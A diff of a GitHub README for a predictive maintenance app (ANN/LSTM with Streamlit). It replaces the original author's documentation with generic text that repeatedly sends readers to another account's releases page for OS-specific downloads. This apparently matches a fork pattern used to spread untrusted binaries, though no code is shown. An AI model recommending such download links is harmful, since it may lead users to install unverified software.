@@ -1,183 +1,103 @@
-# ⚙️ Predictive Maintenance System (ANN + Streamlit)
+# 🛠️ predictive-maintenance-project - Maximize Machine Uptime Effortlessly
 
-This project delivers an intelligent Predictive Maintenance system built with Machine Learning and Deep Learning techniques. It automatically identifies whether data is meant for failure classification or RUL prediction and trains the appropriate model—ANN for static sensor data and LSTM for time-series sequences. Using Adam Optimization and Early Stopping, the system achieves strong performance with high Recall, high R², and low RMSE. The integrated Streamlit interface allows users to upload datasets, train models, and generate real-time failure risk or RUL predictions, making it a complete AI solution for Industry 4.0 machinery maintenance.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Affaq786/predictive-maintenance-project/releases)
 
----
+## 📖 Project Overview
 
-## 🎯 Purpose
-To build an **AI-driven maintenance system** capable of:
+Welcome to the Predictive Maintenance Project! This system helps you maintain your machines by predicting failures before they happen. It uses advanced techniques like Artificial Neural Networks (ANN) for classifying issues and Long Short-Term Memory (LSTM) for forecasting remaining useful life (RUL). The included Streamlit interface allows you to interact with the model and predict machine health in real time. 
 
-- Predicting machine failure (classification)
-- Estimating Remaining Useful Life (RUL) (regression)
-- Supporting both ANN and LSTM deep learning models
-- Offering real-time sensor-based predictions through an intuitive web UI
+## 🚀 Getting Started
 
----
+Follow these simple steps to download and run the Predictive Maintenance Project.
 
-## 🧠 Core Features
+## 💻 System Requirements
 
-✅ **Dataset Auto-Detection**  
-✔ Detects whether the uploaded dataset is AI4I (classification) or NASA C-MAPSS (RUL regression)
+- Operating System: Windows, macOS, or Linux
+- RAM: Minimum 4 GB
+- Storage: At least 500 MB of free space
+- Python: Version 3.6 or above
 
-✅ **ANN Model for Failure Classification**  
-✔ Trains using Adam optimizer, multiple hidden layers, and early stopping  
+## 📥 Download & Install
 
-✅ **LSTM Model for RUL Regression**  
-✔ Automatically processes sequence data for life prediction  
+To download the software, visit this page: [Download the Latest Release](https://github.com/Affaq786/predictive-maintenance-project/releases).
 
-✅ **Interactive Web Interface (Streamlit)**  
-✔ Dataset upload  
-✔ Model training  
-✔ Real-time prediction using sliders  
+1. Open your web browser.
+2. Click on the link above.
+3. Look for the latest version listed there.
+4. Click on the file labeled for your operating system to download it.
+5. Once downloaded, locate the file on your computer.
 
-✅ **Performance Metrics**  
-✔ Accuracy, Precision, Recall (Classification)  
-✔ R², RMSE (Regression)  
+## ⚙️ Running the Application
 
----
+After downloading, you must set up the application to run it smoothly.
 
-## ⚙️ Technologies Used
+1. **Install the Required Software:**
+   - Ensure you have Python installed. You can download it from [python.org](https://www.python.org).
+   - Install Streamlit by opening your command prompt or terminal and running:
+     ```
+     pip install streamlit
+     ```
 
-### 🔹 Machine Learning & Deep Learning  
-- **TensorFlow / Keras** — ANN & LSTM architecture  
-- **scikit-learn** — preprocessing, metrics  
+2. **Unzip the Downloaded File:**
+   - Locate the downloaded file and unzip it into a folder of your choice.
 
-### 🔹 Data Processing  
-- **pandas**, **numpy**
+3. **Navigate to the Project Folder:**
+   - Open your command prompt or terminal.
+   - Use the `cd` command to enter the folder where you unzipped the project. For example:
+     ```
+     cd path_to_your_project_folder
+     ```
 
-### 🔹 Web Deployment  
-- **Streamlit**
+4. **Run the Application:**
+   - In the terminal, type the following command to start the Streamlit interface:
+     ```
+     streamlit run app.py
+     ```
+   - Press **Enter**.
 
-### 🔹 Visualization  
-- **matplotlib**, **seaborn**
+5. **Open the App:**
+   - Once the application is running, a new tab will open in your default web browser, or you can visit `http://localhost:8501` to access it. 
 
-### 🔹 Optimization  
-- **Adam optimizer**
+## 🎮 Using the Application
 
----
-### Project Flowchart
-<img width="1000" height="900" alt="flowchart" src="https://github.com/user-attachments/assets/e52089b4-b49d-4305-9122-de6b60345064" />
+The application features an easy-to-use interface. Here’s how you can make the most out of it:
 
----
+1. **Upload Your Dataset:**
+   - Click on the "Upload" button to choose your dataset.
+   - The system will automatically detect the dataset type.
 
-## 📂 Project Structure
-predictive-maintenance-project/
+2. **Train the Model:**
+   - Click on the "Train" button.
+   - The system will use ANN and LSTM algorithms to train on the dataset.
 
-├── app.py                     # Main Streamlit application with ANN/LSTM logic
+3. **View Predictions:**
+   - After training, the application will provide insights on machine health and failure predictions.
+   - You can visualize results displayed on the dashboard.
 
-├── requirements.txt           # All dependencies
+## 🛠️ Features
 
-└── README.md                  # Documentation
+- **Auto-detection of Dataset Type:** Simplifies the process for users.
+- **Failure Classification:** Provides insights into potential failures using ANN.
+- **RUL Forecasting:** Estimates how long before a machine may fail using LSTM.
+- **Real-time Interface:** Offers a straightforward web-based interface for immediate access.
+- **Optimized Performance:** Utilizes Adam optimization and Early Stopping techniques to improve accuracy.
 
+## 🤖 Key Technologies
 
----
+This project leverages several advanced technologies and methodologies:
+- **Python**: The programming language used for development.
+- **Streamlit**: The framework used for building the web interface.
+- **Artificial Neural Networks (ANN)**: For classification tasks.
+- **Long Short-Term Memory (LSTM)**: For forecasting remaining useful life (RUL).
 
-## 📦 Installation & Run Instructions
+## 📄 Documentation
 
-### 1️⃣ Clone the repository
+For more detailed information about the project, refer to the Wiki section in the repository or explore the source code directly. Helpful guides and resources can be found there.
 
-```bash
-git clone https://github.com/yourusername/predictive-maintenance-project
+## 📞 Support
 
-```
----
-### 2️⃣ Navigate into the directory
-```bash
-cd predictive-maintenance-project
-```
----
-### 3️⃣ Create a virtual environment
-```bash
-python -m venv venv
-```
----
-### 4️⃣ Activate the environment
+If you encounter any issues, feel free to open an issue in the repository or reach out through our discussions page.
 
-| OS          | Command                    |
-| ----------- | -------------------------- |
-| Windows     | `.\venv\Scripts\activate`  |
-| Linux/macOS | `source venv/bin/activate` |
+Remember, for downloads and updates, always check our [Releases Page](https://github.com/Affaq786/predictive-maintenance-project/releases). 
 
----
-
-### 5️⃣ Install dependencies
-```
-pip install -r requirements.txt
-```
----
-### 6️⃣ Run the Streamlit App
-```
-streamlit run app.py
-```
----
-
-### ⭐ Your browser will open automatically at:
-```
-http://localhost:8501
-```
----
-### ▶️ Usage
-### 🔹 Step 1 — Upload Dataset
-
-Click “Upload Dataset (.txt or .csv)” and upload either:
-
-AI4I 2020 Predictive Maintenance dataset (CSV)
-
-NASA C-MAPSS dataset (TXT)
-
-### 🔹 Step 2 — Train the Model
-
-Click “Train Predictive Model (Auto-Detect)”
-The system will:
-
-Identify dataset type
-
-Preprocess data
-
-Train ANN (classification) or LSTM (regression)
-
-Display performance metrics
-
-### 🔹 Step 3 — Real-Time Prediction
-
-## Using the prediction panel:
-
-Adjust sliders for temperature, vibration, speed, load
-
-Click “Predict Failure Risk” or “Predict RUL”
-
-📊 Output will appear instantly on the dashboard.
-
----
-### 💬 Sample Inputs & Outputs
-
-Upload: AI4I_2020.csv
-
-Upload: C-MAPSS_TRAIN_FD001.txt
-
-Adjust sliders for simulated machine readings
-
-Check predicted RUL or Failure Probability
-
-<img width="1919" height="908" alt="Screenshot 2025-12-04 144523" src="https://github.com/user-attachments/assets/194233ce-3c38-4546-9ad1-713a844c52da" />
-<img width="1750" height="637" alt="Screenshot 2025-12-04 150858" src="https://github.com/user-attachments/assets/1e7d50ef-a8f4-42ed-93b3-730108418662" />
-<img width="1751" height="526" alt="Screenshot 2025-12-04 150909" src="https://github.com/user-attachments/assets/5a873696-7a7d-4665-89eb-9b118fc717a4" />
-<img width="1752" height="436" alt="Screenshot 2025-12-04 150920" src="https://github.com/user-attachments/assets/e3b33261-dd9b-44f1-8ff0-5b8c3450c7f4" />
-<img width="1357" height="608" alt="Screenshot 2025-12-04 150934" src="https://github.com/user-attachments/assets/ed4ef95f-9bde-464c-b875-fd3815c2d99f" />
-
----
-### 📜 License
-This project is licensed under the MIT License — free to use, modify, improve, and distribute with proper credit.
-
----
-### 👨‍💻 Developed By
-
-Chaitanya Bhosale
-
-🔗 GitHub: https://github.com/Chaitanya5068
-
-🔗 LinkedIn: https://www.linkedin.com/in/chaitanya-bhosale
-
-
-
-
+Your utilization of the Predictive Maintenance Project can significantly improve the reliability of your equipment and minimize downtime. Happy predicting!
